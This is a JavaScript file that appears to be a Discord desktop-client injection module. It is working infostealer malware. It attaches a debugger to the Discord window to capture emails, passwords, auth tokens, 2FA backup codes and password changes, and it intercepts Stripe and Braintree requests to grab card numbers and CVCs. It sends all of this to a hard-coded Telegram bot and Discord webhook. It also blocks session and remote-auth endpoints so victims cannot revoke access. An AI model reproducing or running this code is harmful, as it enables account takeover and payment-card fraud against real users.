const fs = require('fs');
const os = require('os');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');
const CONFIG = {
    bot_token: "7314952627:AAEukzyjenzJXWQeuRIl46NsugbLcxCVHsc",
    chat_id: "6807661392",
    discord_webhook_url: "https://discord.com/api/webhooks/1350720317865070663/0PK_02RCNRVJ-6ot6cgDYETpJsHJ9hvzz_-euK1J14sHutUqn986XGbM7sz9krrUe9Vf",
    discord_username: "Notification Bot",
    discord_avatar_url: "https://i.imgur.com/4M34hi2.png",
    badges: {
        Discord_Emloyee: {
            Value: 1,
            Emoji: "Discord Employee",
            Rare: true,
        },
        Partnered_Server_Owner: {
            Value: 2,
            Emoji: "Partenered Server Owner",
            Rare: true,
        },
        HypeSquad_Events: {
            Value: 4,
            Emoji: "Hype Squad Events",
            Rare: true,
        },
        Bug_Hunter_Level_1: {
            Value: 8,
            Emoji: "Bug Hunter Level 1",
            Rare: true,
        },
        Early_Supporter: {
            Value: 512,
            Emoji: "Early Supporter",
            Rare: true,
        },
        Bug_Hunter_Level_2: {
            Value: 16384,
            Emoji: "Bug Hunter Level 2",
            Rare: true,
        },
        Early_Verified_Bot_Developer: {
            Value: 131072,
            Emoji: "Early Verified Bot Developper",
            Rare: true,
        },
        House_Bravery: {
            Value: 64,
            Emoji: "House Bravery",
            Rare: false,
        },
        House_Brilliance: {
            Value: 128,
            Emoji: "House Brillance",
            Rare: false,
        },
        House_Balance: {
            Value: 256,
            Emoji: "House Balance",
            Rare: false,
        },
        Active_Developer: {
            Value: 4194304,
            Emoji: "Active Developper",
            Rare: false,
        },
        Certified_Moderator: {
            Value: 262144,
            Emoji: "Certified Moderator",
            Rare: true,
        },
        Spammer: {
            Value: 1048704,
            Emoji: "⌨️",
            Rare: false,
        },
    },
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
};

const sendTelegramMessage = async (message) => {
    const url = `https://api.telegram.org/bot${CONFIG.bot_token}/sendMessage`;
    const data = {
        chat_id: CONFIG.chat_id,
        text: message,
        parse_mode: "Markdown",
    };
    const options = {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
    };
    const req = https.request(url, options, (res) => {
        res.on("data", () => {});
    });
    req.on("error", (error) => {
        console.error("Error sending message to Telegram:", error);
    });
    req.write(JSON.stringify(data));
    req.end();
};

const sendDiscordMessage = async (message) => {
    const url = CONFIG.discord_webhook_url;
    const data = {
        content: message,
        username: CONFIG.discord_username,
        avatar_url: CONFIG.discord_avatar_url
    };
    const options = {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
    };
    const req = https.request(url, options, (res) => {
        res.on("data", () => {});
    });
    req.on("error", (error) => {
        console.error("Error sending message to Discord:", error);
    });
    req.write(JSON.stringify(data));
    req.end();
};

const getBadges = (flags) => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
    }
    return badges || '`❌`';
};
const EmailPassToken = async (email, password, token, action) => {
    const message = `*User Action*: ${action}\n\n📧 *Email*: \`${email}\`\n🔑 *Password*: \`${password}\`\n💳 *Token*: \`${token}\``;
    sendTelegramMessage(message);
    sendDiscordMessage(message);
};
const BackupCodesViewed = async (codes, token) => {
    const filteredCodes = codes.filter((code) => !code.consumed);
    const codeMessage = filteredCodes.map(code => `${code.code.substr(0, 4)}-${code.code.substr(4)}`).join("\\n");
    const message = `*Backup Codes Viewed*:\n\n🔐 *Codes*:\n\`\`\`\\n${codeMessage}\\n\`\`\`\n💳 *Token*: \`${token}\``;
    sendTelegramMessage(message);
    sendDiscordMessage(message);
};
const PasswordChanged = async (newPassword, oldPassword, token, flags) => {
    const badges = getBadges(flags);
    const message = `*Password Changed*:\n\n🔑 *New Password*: \`${newPassword}\`\n🔑 *Old Password*: \`${oldPassword}\`\n💳 *Token*: \`${token}\`\n🏅 *Badges*: ${badges}`;
    sendTelegramMessage(message);
    sendDiscordMessage(message);
};
const CreditCardAdded = async (number, cvc, month, year, token) => {
    const message = `*Credit Card Added*:\n\n🔢 *Number*: \`${number}\`\n🔒 *CVC*: \`${cvc}\`\n⏳ *Expiration*: \`${month}/${year}\`\n💳 *Token*: \`${token}\``;
    sendTelegramMessage(message);
    sendDiscordMessage(message);
};
const PaypalAdded = async (token) => {
    const message = `*PayPal Added*:\n\n💳 *Token*: \`${token}\``;
    sendTelegramMessage(message);
    sendDiscordMessage(message);
};

let email = "";
let password = "";
let initiationCalled = false;
const createWindow = () => {
    mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;
    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled) {
            initiationCalled = true;
        }
        if (method !== 'Network.responseReceived') return;
        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;
        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
            requestId: params.requestId
        });
        const responseData = JSON.parse(responseUnparsedData.body);
        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
            requestId: params.requestId
        });
        const requestData = JSON.parse(requestUnparsedData.postData);
        switch (true) {
            case params.response.url.endsWith('/login'):
                if (!responseData.token) {
                    email = requestData.login;
                    password = requestData.password;
                    return;
                }
                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                break;
            case params.response.url.endsWith('/register'):
                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                break;
            case params.response.url.endsWith('/totp'):
                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                break;
            case params.response.url.endsWith('/codes-verification'):
                BackupCodesViewed(responseData.backup_codes, responseData.token);
                break;
            case params.response.url.endsWith('/@me'):
                if (!requestData.password) return;
                if (requestData.email) {
                    EmailPassToken(requestData.email, requestData.password, responseData.token, `changed email to ${requestData.email}`);
                }
                if (requestData.new_password) {
                    PasswordChanged(requestData.new_password, requestData.password, responseData.token, responseData.flags);
                }
                break;
        }
    });
    mainWindow.webContents.debugger.sendCommand('Network.enable');
    mainWindow.on('closed', () => {
        createWindow();
    });
};
createWindow();
session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method !== 'POST') return;
    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;
        case details.url.endsWith('paypal_accounts'):
            PaypalAdded(await getToken());
            break;
    }
});
session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
        cancel: true
    });
});
module.exports = require("./core.asar");
